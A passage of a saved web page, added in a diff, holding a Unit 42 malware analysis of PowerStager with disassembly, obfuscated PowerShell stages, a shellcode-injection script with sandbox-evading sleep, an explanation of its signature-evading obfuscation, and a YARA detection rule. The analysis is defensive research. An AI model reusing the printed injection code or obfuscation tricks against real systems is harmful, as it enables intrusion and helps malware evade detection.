@@ -1,0 +1,1033 @@
+
+<!doctype html>
+<html >
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
+	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
+	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
+	<meta name="msapplication-TileColor" content="#000000">
+	<meta name="theme-color" content="#000">
+  <title>PowerStager Analysis</title>
+<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-powerstager-analysis/" />
+
+<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
+<meta name="description" content="Unit 42’s analyzes PowerStager and the unique obfuscation technique it was employing for its PowerShell segments"/>
+<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
+<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-powerstager-analysis/" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="PowerStager Analysis" />
+<meta property="og:description" content="Unit 42’s analyzes PowerStager and the unique obfuscation technique it was employing for its PowerShell segments" />
+<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-powerstager-analysis/" />
+<meta property="og:site_name" content="Unit42" />
+<meta property="article:tag" content="Powershell" />
+<meta property="article:tag" content="PowerStager" />
+<meta property="article:section" content="Unit 42" />
+<meta property="article:published_time" content="2018-01-12T13:00:30+00:00" />
+<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
+<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
+<meta property="og:image:width" content="650" />
+<meta property="og:image:height" content="300" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:description" content="Unit 42’s analyzes PowerStager and the unique obfuscation technique it was employing for its PowerShell segments" />
+<meta name="twitter:title" content="PowerStager Analysis" />
+<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
+<!-- / Yoast SEO plugin. -->
+
+<link rel='dns-prefetch' href='//www.google.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; PowerStager Analysis Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-powerstager-analysis/feed/" />
+<meta property="og:likes" content="0"/>
+<meta property="og:readtime" content="8"/>
+<meta property="og:views" content="22,723"/>
+<meta property="og:date_created" content="January 12, 2018 at 5:00 AM"/>
+<meta property="og:post_length" content="2493"/>
+<meta property="og:category" content="Unit 42"/>
+<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
+<meta property="og:author" content="Jeff White"/>
+<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/jeff-white/"/>
+<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
+<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"PowerStager Analysis","name":"PowerStager Analysis","description":"Unit 42\u2019s analyzes PowerStager and the unique obfuscation technique it was employing for its PowerShell segments","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-powerstager-analysis\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-powerstager-analysis\/","datePublished":"January 12, 2018","articleBody":"Introduction\nIn this blog post I\u2019m going to be taking a look at a tool called PowerStager, which has been flying under the radar since April of 2017. The main reason it caught my attention was due to a fairly unique obfuscation technique it was employing for its PowerShell segments which I haven\u2019t seen utilized in other tools yet. When tracking this technique, I saw an uptick in usage of PowerStager for in-the-wild attacks around December 2017.\nI\u2019ll cover how the tool works briefly and then touch on some of the attacks and artifacts that can be observed.\nPowerStager Overview\nAt its core, PowerStager is a Python script that generates Windows executables using C source code and then, utilizing multiple layers of obfuscation, launches PowerShell scripts with the end goal of executing a shellcode payload. There are quite a few configuration options for PowerStager which gives it a fair amount of flexibility. Below are a some of the listed configuration options from the code:\n\n \tAbility to choose target platform (x86 or x64)\n \tAbility to use additional obfuscation on top of defaults\n \tAbility to display customized error messages\/executable icon for social engineering\n \tAbility to utilize Meterpreter or other built-in shellcode payloads\n \tAbility to fetch remote payloads or embed them into the executable\n \tAbility to escalate privileges using UAC\n\nFor the samples I\u2019ll be covering, the general flow is laid out in the following image.\n&nbsp;\n&nbsp;\n\nFigure 1. PowerStager Execution Flow\nI\u2019ll cover each piece before diving into the bulk analysis of all samples observed thus far.\n\nPE Analysis\nIt should be noted that most of this analysis was prior to actually finding the source code. After looking at numerous samples, it was clear that they were being generated programmatically and so I set out to try and identify the source.\nWithin each of the executables was an embedded string for the file that gets created.\n004015BC   |.  C74424 08 05F04&gt;MOV DWORD PTR SS:[ESP+8],75809731.0040&gt;;  ASCII \"%s\\\\A62q1gMHhRWy\"\nThe file name is randomized between samples which was a major clue that there was a builder. This value is again referenced later on deep within multiple layers of PowerShell scripts and gave further credence to this theory, as typically these random file names are generated on the fly and not embedded within.\nThe initial executable created by PowerStager is pretty straight forward. It gets the %TMP% environment path and creates the file with the embedded file name. Afterwards it performs two memcpy() calls for data found within the .data section of the executable and moves them into a new memory page. For the sample looked at in this analysis, the first memcpy() grabs data from offset 0x20 in the .data section, whereas the second memcpy() grabs the same size of data from offset 0x67E0. Finally, it runs a decoding function on it before finally saving it to the file.\n0040164E   |&gt; \/8D95 D8C6FFFF   \/LEA EDX,[LOCAL.3658]\n00401654   |. |8B45 F4         |MOV EAX,[LOCAL.3]\n00401657   |. |01D0            |ADD EAX,EDX                                 ;  75809731.004067E0\n00401659   |. |0FB618          |MOVZX EBX,BYTE PTR DS:[EAX]\n0040165C   |. |8B4D F4         |MOV ECX,[LOCAL.3]\n0040165F   |. |89C8            |MOV EAX,ECX\n00401661   |. |C1E8 06         |SHR EAX,6\n00401664   |. |BA 9D889704     |MOV EDX,497889D\n00401669   |. |F7E2            |MUL EDX                                     ;  75809731.004067E0\n0040166B   |. |89D0            |MOV EAX,EDX                                 ;  75809731.004067E0\n0040166D   |. |C1E8 02         |SHR EAX,2\n00401670   |. |69C0 C0370000   |IMUL EAX,EAX,37C0\n00401676   |. |29C1            |SUB ECX,EAX\n00401678   |. |89C8            |MOV EAX,ECX\n0040167A   |. |0FB68405 188FFF&gt;|MOVZX EAX,BYTE PTR SS:[EBP+EAX+FFFF8F18]\n00401682   |. |31C3            |XOR EBX,EAX\n00401684   |. |89D9            |MOV ECX,EBX\n00401686   |. |8D95 D8C6FFFF   |LEA EDX,[LOCAL.3658]\n0040168C   |. |8B45 F4         |MOV EAX,[LOCAL.3]\n0040168F   |. |01D0            |ADD EAX,EDX                                 ;  75809731.004067E0\n00401691   |. |8808            |MOV BYTE PTR DS:[EAX],CL\n00401693   |. |8345 F4 01      |ADD [LOCAL.3],1\n00401697   |&gt; |8B45 F4          MOV EAX,[LOCAL.3]                           ; ||||\n0040169A   |. |3D BF370000     |CMP EAX,37BF                                ; ||||\n0040169F   |.^\\76 AD           \\JBE SHORT 75809731.0040164E                 ; ||||\n\nThe second set of data is an equal length XOR key and this function just XORs each byte of the two segments of data and then writes the output to the file.\nIt goes through this process one again, copying two sections of data from the .data section and XOR\u2019ing them together to decode the first of the PowerShell commands which it then passes to CreateProcessA(); this command will be analyzed in the next section.\nFinally, the executable calls MessageBoxA and displays a fake error message. Note that tool gives the user the option whether to include this error message.\n&nbsp;\nPowerShell Analysis\nThe first PowerShell script that gets launched begins with simple Hex -&gt; ASCII obfuscation. Between samples, the arguments are random camel case and shortened differently each time.\nPowerSHeLl -WiNdOwsty hiDDeN -comMA \"(-JoIn(('2628277b317d7b307d27 \u2026\nLooking at the source code now, you can see where it passes these arguments to an obfuscation function which makes identification from this perspective alone more difficult.\n: \"[_OBF_POWERSHELL_] -[_OBF_WINDOWSTYLE_] [_OBF_HIDDEN_] -[_OBF_COMMAND_] \\\"[_PS_LOAD_]\\\"\",\nWhile the commands and case may change, the order does not.\nThe decoded script is the first one utilizing the unique obfuscation technique mentioned previously. Its combines multiple styles of token replacement obfuscation and chains together Invoke functions to build a new script which simply base64 decodes and executes a third script.\nBelow is what you typically find with token replacement (composite formatting) obfuscation.\n('{2}{1}{3}{0}'-f'LE','i','Set-Var','ab')\nThis builds the string \u201cSet-Variable\u201d by replacing each \u201c{#}\u201d with the respective string value found at that index in the array.\nThe new method works on the same premise but instead of directly calling the index, it builds the initial string of format items by doing two replace() calls. Visually, it\u2019s not much more difficult to understand and builds the string \u201cvalue\u201d, but from a scanning perspective it helps to further obfuscate commands and protect against common signature techniques.\n(('4 2 1 0 3'-REpLaCe'\\w+','{${0}}'-RePLACE' ','')-f'u','l','a','e','v')\nThe third script that gets executed in this phase is again a combination of obfuscation techniques that, as now known from the source code, go through individual obfuscation functions that vary this code sample to sample.\n&amp;(('9 0 7 2 4 8 6 5 8 3 1 0'-RePlace'\\w+','{${0}}'-rEPLACe' ','')-f'e','l','-','b','v','i','r','t','a','s') yZs6ssMMnN2l 27;&amp;('SEt-VariaB'+'l'+'e') ymr1vVoTcIP3 44;&amp;('{1}{0}'-f'E','SeT-VaRiaBL') lMRIO47kiset 11;&amp;('Se'+'t-vA'+'riabLE') x6ZzoiDv0Y3X((((.('Get-'+'vAR'+'iAbLe') yZs6ssMMnN2l).('vALU'+'e')+18)-AS[chaR]).('tOST'+'R'+'i'+'ng').InvoKe()+(((&amp;(('8 7 5 6 3 0 1 4 0 2 9 7'-rEpLaCE'\\w+','{${0}}'-RePlaCE' ','')-f'a','r','b','v','i','t','-','e','g','l') ymr1vVoTcIP3).(('3 1 4 0 2'-REplaCE'\\w+','{${0}}'-rePLaCE' ','')-f'u','a','e','v','l')+57)-As[cHaR]).('TOStr'+'In'+'G').iNVOKE()+(((&amp;('GEt-vAriaBlE') lMRIO47kiset).('va'+'Lu'+'e')+88)-AS[CHAr]).('{1}{3}{2}{0}'-f'NG','tOs','i','TR').InVokE());poWErshell -noNiNtERA -NOLO -NOprOF -window HIDdeN -eXe BypAss (&amp;('GET-vaRi'+'AbLE') x6ZzoiDv0Y3X).(('1 0 3 4 2'-rEpLaCe'\\w+','{${0}}'-rEPlaCe' ','')-f'a','v','e','l','u').('tOsTri'+'n'+'g').INvokE()([chaR[]](([chAr[]](&amp;('new-o'+'bje'+'c'+'T') (('7 5 0 8 3 5 6 2 1 4 5 7 0'-replAcE'\\w+','{${0}}'-rEplAcE' ','')-f't','l','c','w','i','e','b','n','.')).(('10 4 5 7 3 4 9 10 6 0 8 2 7 1'-RePLAcE'\\w+','{${0}}'-repLAcE' ','')-f't','g','i','l','o','w','s','n','r','a','d').InVOke($env:temp+'\\A62q1gMHhRWy'))|%{$wlITpDaitdSn=0}{$_-bxOr'cwqslBksSTba7qa7VJqrWOEWo4nQo41P'[$wlITpDaitdSn++%32]})-jOIN'');Remove-Item $env:temp'\\A62q1gMHhRWy'\nThe meat of this script is towards the very end. Here you can see that it loads the file that was written to disk by the executable (\u201cA62q1gMHhRWy\u201d) and then does a binary XOR with the key \u201ccwqslBksSTba7qa7VJqrWOEWo4nQo41P\u201d. Again, this is all randomized, including the XOR key, but seeing the static file name value this deep into the sample was a key indicator that this was likely generated from a tool and not manually crafted at scale.\nOnce decoded it results in another PowerShell script that begins like the very first, with a Hex-&gt;ASCII obfuscation that gets invoked.\n(-Join(('24706950745a4e78723166354b3d26282761 \u2026\nFinally, it launches a script which does the tried and true shellcode injection technique. The framework for this script can be found in most PowerShell offensive tools, but effectively it calls VirtualAlloc() to create memory for the shellcode to reside, memset() to copy the shellcode in, and then CreateThread() to transfer execution to the shellcode after a long sleep, which is included for sandbox avoidance.\n$piPtZNxr1f5K=&amp;('ad'+'d-'+'TyPE') -m '[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);' -name 'Win32' -ns Win32Functions -pas;[byTE[]]$RDm7s2YDUaBL=0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,\n\u2026&lt;TRUNCATED&gt;\u2026\n0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x1,0xc3,0x29,0xc6,0x75,0xee,0xc3;$lXw9sqCMdGHQ=$piPtZNxr1f5K::('{2}{1}{0}{3}'-f'o','lAll','viRtuA','C').inVokE(0,[Math]::(('2 0 1'-REpLAcE'\\w+','{${0}}'-rEPlaCe' ','')-f'a','x','m').INvoke($RDm7s2YDUaBL.(('1 5 2 3 0 4'-RepLaCe'\\w+','{${0}}'-ReplAce' ','')-f't','l','n','g','h','e'),0x1000),0x3000,0x40);for($Zxv0oxgiqKpR=0;$Zxv0oxgiqKpR -le ($RDm7s2YDUaBL.('lEn'+'G'+'T'+'h')-1);$Zxv0oxgiqKpR++){[VoID]$piPtZNxr1f5K::(('0 3 0 2 3 1'-RepLAce'\\w+','{${0}}'-rEplacE' ','')-f'm','t','s','e').INVOKe([InTptr]($lXw9sqCMdGHQ.ToInt32()+$Zxv0oxgiqKpR),$RDm7s2YDUaBL[$Zxv0oxgiqKpR],1)};$piPtZNxr1f5K::('CrEatETHrE'+'A'+'d').InvoKE(0,0,$lXw9sqCMdGHQ,0,0,0);.('{0}'-f'STarT-slEep') 100000\n\nThe shellcode is fairly standard and won\u2019t be looked at here; however, there are multiple static shellcode blobs within the source code and then the option to embed a Meterpreter reverse_tcp shellcode. For the handful of ones I manually looked at, every single instance was the embedded \u201creverse_tcp stager\u201d found in the source code.\nIn total, there are 7 total PowerShell scripts that can be generated from the script and the commented names are listed below and show the general process of execution that I tried to illustrate at the beginning.\nMain\nBase64 decoder\nXOR decryptor\nSystem.Net.WebClient\nEncoded command\nMemory injection\nReverse powershell\n\nAll in all, I feel it\u2019s a well put together framework that offers good obfuscation and flexibility in avoiding detection.\n&nbsp;\nDetection in the Wild\nNow that I\u2019ve analyzed the samples and found the source code, which confirms a lot of the above analysis efforts, I\u2019ll talk briefly about attacks seen in the wild.\nAs of December 29th 2017, Palo Alto Networks has observed 502 unique samples of PowerStager in the wild. In instances where I was able to identify a target, they all belonged to Western European Media and Wholesale organizations; however, there were also many samples that were identified as being used for testing and sales proof-of-concepts demonstrations. I don\u2019t find this surprising as blue teams, red teams, and security companies frequently test out new tools to continue innovating.\nLooking at the statically configured file name across the samples, only 7 file names were used more than once with one file name found across 9 samples. All of the duplicate file names were related to testing \u2013 eg. scan a file, add a byte, scan the file again, slightly modify the file in some other way, scan again, so on and so forth.\nWhen building the samples, PowerStager includes a Manifest in the C source code that defines certain attributes of the executables. This provides a decent mechanism to track the samples, although it is trivial to change. Specifically, the \u201cDescription\u201d field is static and the \u201cCompany Name\u201d always ends with \u201c INC.\u201d.\nrc_company_name\t\t\t= names.get_last_name() + \" INC.\"\nrc_description\t\t\t= \"Lorem ipsum dolor sit amet, consecteteur adipiscing elit.\"\nrc_internal_name\t\t= \"\".join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))\nrc_legal_name\t\t\t= names.get_full_name()\nrc_original_filename\t= output.split(\"\/\")[-1:][0]\nrc_product_name\t\t\t= rc_internal_name\n\nYou\u2019ll note that the \u201cOriginal Filename\u201d field is set to part of the \u201coutput\u201d variable. This is a mandatory field specified at compile time and provides a tiny glimpse into the person behind the sample. While there were over 427 unique values in this field, the below table shows the names for files tied to more than one sample.\n\n\n\nSample Count\nOriginal Filename\n\n\n12\ntest\n\n\n9\nlove\n\n\n8\nyoutube\n\n\n5\n123\n\n\n4\npayload\n\n\n3\nvirus\n\n\n3\ntest32\n\n\n3\npowerstager\n\n\n3\npowershell\n\n\n3\nhack\n\n\n2\nyit\n\n\n2\nwindows\n\n\n2\nwin7\n\n\n2\ntry4\n\n\n2\ntransaction\n\n\n2\ntest1\n\n\n2\nserver\n\n\n2\nrat\n\n\n2\noneshot.exe\n\n\n2\nnudes.exe\n\n\n2\ninstall\n\n\n2\nfist1\n\n\n2\ndemon.exe\n\n\n2\ncarlos\n\n\n2\nbackdoor\n\n\n2\nabc\n\n\n2\nTest\n\n\n2\nOkari\n\n\n2\n555\n\n\n2\n1\n\n\n\nTable 1 Repeated filenames across samples\nOther notable names include the usual targets for executable masquerading: vnc, vlc, Skype, Notepad, and Minecraft.\nAdditionally, the \u201cProductName\u201d field will always be a 10-character string with mixed upper-case letters and digits.\nThese all provide useful methods to statically characterize these files and, coupled with unique obfuscation and PowerShell methods during dynamic analysis, a solid way to identify them.\nFor error messages, all but 30 samples included the default error message. The ones that did not simply contained no error message.\nThe following YARA rule will provide additional coverage for the x86 and x64 variants of the generated Windows executable.\nrule powerstager\n{\n    meta:\n\tauthor = \"Jeff White - jwhite@paloaltonetworks.com @noottrak\"\n\tdate = \"02JAN2018\"\n\thash1 = \"758097319d61e2744fb6b297f0bff957c6aab299278c1f56a90fba197795a0fa\" \/\/x86\n\thash2 = \"83e714e72d9f3c500cad610c4772eae6152a232965191f0125c1c6f97004b7b5\" \/\/x64\n\tdescription = \"Detects PowerStager Windows executable, both x86 and x64\"\n    strings:\n\t$filename = \/%s\\\\[a-zA-Z0-9]{12}\/\n\t$pathname = \"TEMP\" wide ascii\n\/\/\t$errormsg = \"The version of this file is not compatible with the version of Windows you're running.\" wide ascii\n\t$filedesc = \"Lorem ipsum dolor sit amet, consecteteur adipiscing elit\" wide ascii\n        $apicall_01 = \"memset\"\n\t$apicall_02 = \"getenv\"\n\t$apicall_03 = \"fopen\"\n\t$apicall_04 = \"memcpy\"\n\t$apicall_05 = \"fwrite\"\n\t$apicall_06 = \"fclose\"\n\t$apicall_07 = \"CreateProcessA\"\n\t$decoder_x86_01 = { 8D 95 [4] 8B 45 ?? 01 D0 0F B6 18 8B 4D ?? }\n\t$decoder_x86_02 = { 89 C8 0F B6 84 05 [4] 31 C3 89 D9 8D 95 [4] 8B 45 ?? 01 D0 88 08 83 45 [2] 8B 45 ?? 3D }\n\t$decoder_x64_01 = { 8B 85 [4] 48 98 44 0F [7] 8B 85 [4] 48 63 C8 48 }\n\t$decoder_x64_02 = { 48 89 ?? 0F B6 [3-6] 44 89 C2 31 C2 8B 85 [4] 48 98 }\n    condition:\n\tuint16be(0) == 0x4D5A\n\t  and\n\tall of ($apicall_*)\n\t  and\n\t$filename\n\t  and\n\t$pathname\n\t  and\n\t$filedesc\n\t  and\n\t(2 of ($decoder_x86*) or 2 of ($decoder_x64*))\n}\n\nConclusion\nWhile it\u2019s not the most advanced toolset out there, the author has gone through a lot of trouble in attempting to obfuscate and make dynamic detection more difficult. As I mentioned previously, PowerStager has covered a lot of the bases in obfuscation and flexibility well, but it hasn\u2019t seen too much usage as of yet; however, it is on the rise and another tool to keep an eye on as it develops.\nPalo Alto Networks currently tracks PowerStager in AutoFocus via the PowerStager tag. Wildfire has been updated with new signatures to ensure protection against these executables. The YARA file, PE meta data, and a list of hashes related to this tool, can be found on the Unit 42 GitHub.\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Jeff White"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
+<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
+<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
+<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
+<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
+<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"56811","token":"7e15a0f8b3","debug":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
+<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.4.1" />
+<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=56811' />
+<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-powerstager-analysis%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-powerstager-analysis%2F&#038;format=xml" />
+<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
+<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
+				 -webkit-transition: opacity 0.3s ease;
+				 -moz-transition: opacity 0.3s ease;
+				 -o-transition: opacity 0.3s ease;
+				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
+				 -webkit-transition: opacity 0.3s ease;
+				 -moz-transition: opacity 0.3s ease;
+				 -o-transition: opacity 0.3s ease;
+				 transition: opacity 0.3s ease;}
+		#wpdevart_lb_information_content{
+			width:100%;	
+		}
+		#wpdevart_info_counter_of_imgs{
+			    display: inline-block;
+				padding-left:15px;
+				padding-right:4px;
+				font-size:20px;
+				color:#000000;
+		}
+		#wpdevart_info_caption{
+			    display: inline-block;
+				padding-left:15px;
+				padding-right:4px;
+				font-size:20px;
+				color:#000000;
+		}
+		#wpdevart_info_title{
+			    display: inline-block;
+				padding-left:5px;
+				padding-right:5px;
+				font-size:15px;
+				color:#000000;
+		}
+		@-webkit-keyframes rotate {
+			to   {-webkit-transform: rotate(360deg);}
+			from  {-webkit-transform: rotate(0deg);}
+		}
+		@keyframes rotate {
+			to   {transform: rotate(360deg);}
+			from  {transform: rotate(0deg);}
+		}
+		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
+			-webkit-animation: rotate 2s linear  infinite;
+    		animation: rotate 2s linear infinite;
+		}
+	  </style>        <script>var $ = jQuery;</script>
+  
+  
+<script type="text/javascript">
+;(function(win, doc, style, timeout) {
+var STYLE_ID = 'at-body-style';
+function getParent() {
+return doc.getElementsByTagName('head')[0];
+}
+function addStyle(parent, id, def) {
+if (!parent) {
+return;
+}
+var style = doc.createElement('style');
+style.id = id;
+style.innerHTML = def;
+parent.appendChild(style);
+}
+function removeStyle(parent, id) {
+if (!parent) {
+return;
+}
+var style = doc.getElementById(id);
+if (!style) {
+return;
+}
+parent.removeChild(style);
+}
+addStyle(getParent(), STYLE_ID, style);
+setTimeout(function() {
+removeStyle(getParent(), STYLE_ID);
+}, timeout);
+}(window, document, "body {visibility:hidden !important}", 3000));
+</script>
+
+<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
+<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
+  </head>
+  <body class="post-template-default single single-post postid-56811 single-format-standard">
+    <!--[if IE]>
+      <div class="alert alert-warning">
+        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
+    <![endif]-->
+    <header class="haeder py-15 position-relative z-index-2">
+  <div class="container px-sm-30 px-35">
+    <div class="row">
+      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
+                  <a href="https://www.paloaltonetworks.com/">
+<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
+<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
+<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
+<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
+<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
